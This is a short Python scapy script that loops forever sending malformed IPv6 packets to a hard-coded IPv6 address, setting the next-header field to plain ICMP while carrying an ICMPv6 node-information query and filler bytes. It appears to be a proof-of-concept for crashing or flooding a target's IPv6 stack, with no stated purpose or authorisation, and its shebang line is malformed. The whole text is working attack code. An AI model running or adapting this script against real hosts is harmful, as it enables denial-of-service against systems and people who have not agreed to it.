
#/usr/bin/env python
from scapy.all import *

z = "Q" * 30
send(IPv6(dst="2001:1c06:1b0e:2600:9dd4:ce94:b17e:9ab4",nh=1)/ICMPv6NIQueryNOOP(type=4)/z, loop=1) #nh1 -> icmp (not v6) 
